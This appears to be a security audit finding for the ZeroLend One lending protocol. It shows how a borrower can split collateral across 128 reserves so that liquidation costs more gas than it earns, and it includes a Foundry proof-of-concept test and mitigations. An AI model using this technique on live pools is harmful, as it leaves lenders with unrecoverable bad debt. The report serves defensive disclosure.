Shiny Seaweed Mongoose

High

# Borrowers can make their position unprofitable to liquidated by using too many collateral tokens.

### Summary

The maximum number of reserve tokens that a pool can have is 128 (This to prevent out of gas error). 
During liquidation all 128 assets are looped through adding to the total gas usage, 
a malicious user can exploit this by providing collateral worth 500 USD in the 128 reserve tokens, so they supply collateral of about 3.9 USD in each.
after that, they borrow about 400 of the tokens they want.

### Root Cause


The root cause of this bug lies in the fact that users can supply any amount of collateral even 1 wei and still take loans with it.
The more the numbers of collaterals they have in their basket the more the gas usage during liquidation. 

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L82

```js

  function calculateUserAccountData(
    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage _balances,
    mapping(address => DataTypes.ReserveData) storage reservesData,
    mapping(uint256 => address) storage reservesList,
    DataTypes.CalculateUserAccountDataParams memory params
  ) internal view returns (uint256, uint256, uint256, uint256, uint256, bool) {

    //@query what happens when i supply and withdraw
    if (params.userConfig.isEmpty()) {
      return (0, 0, 0, 0, type(uint256).max, false);
    }

    CalculateUserAccountDataVars memory vars;
    uint256 reservesCount = IPool(params.pool).getReservesCount();
@-> while (vars.i < reservesCount) {
      if (!params.userConfig.isUsingAsCollateralOrBorrowing(vars.i)) {
        unchecked {
          ++vars.i;
        }
        continue;
      }
    ..
```

For example 
ETH = 2271 USD
if they borrow with the whole 128 assets as collateral the gas used during liquidation will be  1,005,205 that's about 2.28 USD in gas cost.
Given that the collateral for the single asset that the liquidator wants to liquidate is 3.9 USD, the liquidation is not really worth it as the liquidation bonus cannot cover the gas cost.

The total cost of liquidating the whole position is (1,005,205 * 128 / 2) = 64,333,120 i.e 147 USD


### Internal pre-conditions

A pool with 128 reserve tokens

### External pre-conditions

_No response_

### Attack Path

Assuming that the average LTV is 0.8

1. Attacker supplies 3.9 USD to all 128 reserves which is about 500 USD
2. Attacker borrows 400 USD.
3. Heath factor falls below 1.
4. The gas cost of liquidating just one collateral is 2.28 USD and the gain is (3.9 * 1.05 - 3.9) = 0.195 USD
5. Because the gas cost in liquidating the position is far greater than the liquidation bonus they will not liquidate the position.


### Impact

1. The position will not be liquidated on time. 
2. Many positions will go insolvent without liquidators to close them.
3. Liquidity providers will lose money.

### PoC


Add the following test to the `forge/core/pool` folder and run the test.

This is the output.

Gas Used : 1005198
HF before : 916085486657142857 35000000000
HF After  : 916743203363504031 34700037495

We can see the current gas cost is 1005198.


```js
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import './PoolSetup.sol';

import {ReserveConfiguration} from './../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';

import {UserConfiguration} from './../../../../contracts/core/pool/configuration/UserConfiguration.sol';

contract LiquidationGGPOC is PoolSetup {
  using UserConfiguration for DataTypes.UserConfigurationMap;
  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;


  MintableERC20[] tokens;
  MockV3Aggregator[] oracles;

  uint reserveCount = 128;

  address alice = makeAddr("alice");
  address bob = makeAddr("bob");
  uint256 mintAmount =  50000 ether;
  uint256 mintAmountB = 50000 ether;
  uint256 supplyAmountA = 500 ether;
  uint256 supplyAmountB = 750 ether;
  uint256 borrowAmountB = 350 ether;

  function setUp() public {
    poolImplementation = new Pool();

    poolFactory = new PoolFactory(address(poolImplementation));
    configurator = new PoolConfigurator(address(poolFactory));

    poolFactory.setConfigurator(address(configurator));

    for (uint i = 0; i < reserveCount - 1; i++) {
        tokens.push(new MintableERC20('TOKEN A', 'TOKENA'));
        oracles.push(new MockV3Aggregator(8, 1e8));
    }

    tokens.push(new MintableERC20('WETH9', 'WETH9'));
    oracles.push(new MockV3Aggregator(6, 3000 * 1e8));

    irStrategy = new DefaultReserveInterestRateStrategy(47 * 1e25, 0, 7 * 1e25, 30 * 1e25);

    vm.label(address(poolFactory), 'PoolFactory');
    vm.label(address(irStrategy), 'irStrategy');
    vm.label(address(configurator), 'configurator');

    poolFactory.createPool(_poolInitParams());
    IPool poolAddr = poolFactory.pools(0);
    pool = IPool(address(poolAddr));

    pos = keccak256(abi.encodePacked(alice, 'index', uint256(0)));
  }

  function testLiquidationSimple() external {

    _mintAndApprove(alice, tokens[reserveCount - 1], mintAmount, address(pool));

    //Token index 0 is the collateral
    //Token index 1 is the borrowed token
    for (uint i = 0; i < reserveCount - 1; i++) {
        //Don't mint the borrowed token for alice
        _mintAndApprove(alice, tokens[i], mintAmount, address(pool));
        vm.prank(alice);
        pool.supplySimple(address(tokens[i]), alice, (supplyAmountA / (reserveCount - 1)), 0);
        //console.log("S: ", supplyAmountA / (reserveCount - 1));
    }

    //Mint the borrowed token for bob
    _mintAndApprove(bob, tokens[1], mintAmount, address(pool));
    vm.prank(bob);
    pool.supplySimple(address(tokens[1]), bob, supplyAmountB, 0); // 750 tokenB bob supply

    vm.startPrank(alice);

    pool.supplySimple(address(tokens[reserveCount - 1]), alice, 1, 0); // send 1 weth tokenA alice supply
    pool.borrowSimple(address(tokens[1]), alice, borrowAmountB, 0); // 100 tokenB alice borrow
    vm.stopPrank();

    for (uint i = 0; i < reserveCount - 1; i++) {
        if (i == 1) continue;
        oracles[i].updateAnswer(8e7);
    }

    (,uint debtBefore,,,,uint healthFactorBefore) = pool.getUserAccountData(alice, 0);

    uint initialGas = gasleft();
    vm.prank(bob);
    pool.liquidateSimple(address(tokens[0]), address(tokens[1]), pos, 200 ether);
    console.log("Gas Used :", initialGas - gasleft());


    (,uint debtAfer,,,, uint healthFactorAfter) = pool.getUserAccountData(alice, 0);

    console.log("HF before :", healthFactorBefore, debtBefore);
    console.log("HF After  :", healthFactorAfter, debtAfer);

  }

function _poolInitParams() internal view returns (DataTypes.InitPoolParams memory p) {

    (
    address[] memory assets, 
    address[] memory rateStrategyAddresses, 
    address[] memory sources, 
    DataTypes.InitReserveConfig[] memory configurationLocal 
    ) = _generateAddresses();

    address[] memory admins = new address[](1);
    admins[0] = address(this);

    p = DataTypes.InitPoolParams({
      proxyAdmin: address(this),
      revokeProxy: false,
      admins: admins,
      emergencyAdmins: new address[](0),
      riskAdmins: new address[](0),
      hook: address(0),
      assets: assets,
      rateStrategyAddresses: rateStrategyAddresses,
      sources: sources,
      configurations: configurationLocal
    });
  }


  function _generateAddresses()
    internal view returns (address[] memory, address[] memory, address[] memory, DataTypes.InitReserveConfig[] memory) {
    address[] memory assets = new address[](reserveCount);
    address[] memory rateStrategyAddresses = new address[](reserveCount);
    address[] memory sources = new address[](reserveCount);
    DataTypes.InitReserveConfig memory config = _basicConfig();
    DataTypes.InitReserveConfig[] memory configurationLocal = new DataTypes.InitReserveConfig[](reserveCount);
    for (uint i = 0; i < reserveCount; i++) {
        assets[i] = address(tokens[i]);
        rateStrategyAddresses[i] = address(irStrategy);
        sources[i] = address(oracles[i]);
        configurationLocal[i] = config;
    }
    return (assets, rateStrategyAddresses, sources, configurationLocal);
  }

}
```

### Mitigation

1. Enforce a minimum supply amount for an asset to be used as collateral.
2. Limit the total number of active collateral for a position to 10 tokens.

